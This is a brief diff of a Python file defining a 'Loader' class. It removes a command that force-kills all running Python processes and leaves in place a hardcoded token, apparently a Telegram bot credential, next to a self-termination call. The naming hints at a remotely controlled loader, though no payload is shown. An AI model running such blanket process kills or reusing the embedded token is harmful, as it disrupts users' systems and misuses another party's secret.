@@ -16,7 +16,6 @@ import threading
 import re
 class Loader():
 	def __init__(self):
-		os.system("taskkill /IM python.exe /F")
 		self.Kill_Self()
 		self.progrm = sys.argv[1]
 		self.token = "1867535261:AAG_wC07CxlM4ga5UfcA2eE_Jxxm9efPcG8"
